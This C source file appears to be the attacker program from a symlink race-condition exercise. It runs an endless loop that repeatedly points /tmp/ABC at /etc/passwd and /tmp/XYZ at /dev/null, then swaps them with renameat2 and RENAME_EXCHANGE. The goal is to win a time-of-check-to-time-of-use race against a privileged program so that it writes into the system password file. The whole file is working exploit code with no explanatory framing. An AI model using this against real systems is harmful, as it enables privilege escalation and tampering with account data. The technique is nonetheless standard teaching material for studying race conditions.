#define _GNU_SOURCE

#include <unistd.h>
#include <stdbool.h>
#include <stdio.h>

int main () {
	while (true) {
		
		/*		
		unlink("/tmp/XYZ");
		symlink("/etc/passwd","/tmp/XYZ");

		*/
		
		unsigned int flags = RENAME_EXCHANGE;

		unlink("/tmp/ABC");
		symlink("/etc/passwd","/tmp/ABC");
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);	
		
	}
}

